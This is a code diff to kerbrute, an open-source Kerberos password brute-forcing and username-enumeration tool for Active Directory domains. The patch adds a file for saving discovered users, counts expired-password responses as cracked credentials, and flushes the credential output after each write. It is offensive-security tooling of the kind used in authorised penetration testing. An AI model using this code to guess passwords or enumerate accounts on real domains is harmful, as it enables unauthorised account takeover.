@@ -1,5 +1,3 @@
-#!/usr/bin/env python
-#
 # Authors:
 #  Tarlogic (https://www.tarlogic.com)
 #  Zer1t0 (https://github.com/Zer1t0)
@@ -61,6 +59,8 @@ class KerbruteArgumentParser:
 
         self._parser.add_argument('-outputfile', help='File to save discovered user:password')
 
+        self._parser.add_argument('-outputusers', help='File to save discovered users')
+
         self._parser.add_argument('-no-save-ticket', action='store_true',
                                   help='Do not save retrieved TGTs with correct credentials')
 
@@ -105,8 +105,9 @@ def main():
         logging.getLogger().setLevel(logging.INFO)
 
     out_creds_file = open(args.outputfile, "w") if args.outputfile else None
+    out_users_file = open(args.outputusers, "w") if args.outputusers else None
 
-    kerberos_bruter = KerberosBruter(args.domain, args.dc_ip, args.save_ticket, out_creds_file)
+    kerberos_bruter = KerberosBruter(args.domain, args.dc_ip, args.save_ticket, out_creds_file, out_users_file)
     kerberos_bruter.attack(args.users, args.passwords, args.threads)
 
     if out_creds_file:
@@ -114,6 +115,11 @@ def main():
 
         if kerberos_bruter.some_password_was_discovered():
             logging.info("Saved discovered passwords in %s" % args.outputfile)
+
+    if out_users_file:
+        out_users_file.close()
+        if kerberos_bruter.some_user_was_discovered():
+            logging.info("Saved discovered users in %s" % args.outputusers)
 
     if not kerberos_bruter.some_password_was_discovered():
         logging.info("No passwords were discovered :'(")
@@ -123,7 +129,7 @@ class KerberosBruter:
     class InvalidUserError(Exception):
         pass
 
-    def __init__(self, domain, kdc_host, save_ticket=True, out_creds_file=None):
+    def __init__(self, domain, kdc_host, save_ticket=True, out_creds_file=None, out_users_file=None):
         self.domain = domain
         self.kdc_host = kdc_host
         self.save_ticket = save_ticket
@@ -134,6 +140,7 @@ class KerberosBruter:
         self.report_lock = Lock()
 
         self.out_creds_file = out_creds_file
+        self.out_users_file = out_users_file
 
     def attack(self, users, passwords, threads=1):
         pool = ThreadPoolExecutor(threads)
@@ -149,6 +156,9 @@ class KerberosBruter:
                 f.result()
             except Exception as ex:
                 logging.debug('Error trying %s:%s %s' % (ex.kerb_user, ex.kerb_password, ex))
+
+    def some_user_was_discovered(self):
+        return len(self.good_users) > 0
 
     def some_password_was_discovered(self):
         return len(self.good_credentials) > 0
@@ -174,6 +184,9 @@ class KerberosBruter:
 
             elif ex.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
                 self._report_good_user(user)
+
+            elif ex.getErrorCode() == constants.ErrorCodes.KDC_ERR_KEY_EXPIRED.value:
+                self._report_expired_password(user, password)
 
             elif ex.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value:
                 self._report_blocked_user(user)
@@ -214,6 +227,10 @@ class KerberosBruter:
 
             if self.out_creds_file:
                 self.out_creds_file.write("%s:%s\n" % (user, password))
+                self.out_creds_file.flush()
+            if self.out_users_file:
+                self.out_users_file.write("%s\n" % user)
+                self.out_users_file.flush()
 
             if self.save_ticket:
                 ccache = CCache()
@@ -222,6 +239,25 @@ class KerberosBruter:
                 ccache_file = user + '.ccache'
                 ccache.saveFile(ccache_file)
                 logging.info('Saved TGT in %s' % ccache_file)
+
+    def _report_expired_password(self, user, password):
+        with self.report_lock:
+            if user not in self.good_users:
+                self.good_users[user] = True
+
+            if user in self.good_credentials:
+                return
+
+            self.good_credentials[user] = password
+
+            logging.info('Stupendous (Expired password) => %s:%s' % (user, password))
+
+            if self.out_creds_file:
+                self.out_creds_file.write("%s:%s\n" % (user, password))
+                self.out_creds_file.flush()
+            if self.out_users_file:
+                self.out_users_file.write("%s\n" % user)
+                self.out_users_file.flush()
 
     def _report_bad_user(self, user):
         with self.report_lock:
@@ -236,6 +272,10 @@ class KerberosBruter:
             if user in self.good_users:
                 return
 
+            if self.out_users_file:
+                self.out_users_file.write("%s\n" % user)
+                self.out_users_file.flush()
+
             self.good_users[user] = True
             logging.info('Valid user => %s' % user)
 
@@ -243,6 +283,10 @@ class KerberosBruter:
         with self.report_lock:
             if user in self.good_users:
                 return
+
+            if self.out_users_file:
+                self.out_users_file.write("%s\n" % user)
+                self.out_users_file.flush()
 
             self.good_users[user] = True
             logging.info('Valid user => %s [NOT PREAUTH]' % user)
@@ -254,4 +298,3 @@ class KerberosBruter:
 
             self.bad_users[user] = True
             logging.info('Blocked/Disabled user => %s' % user)
-
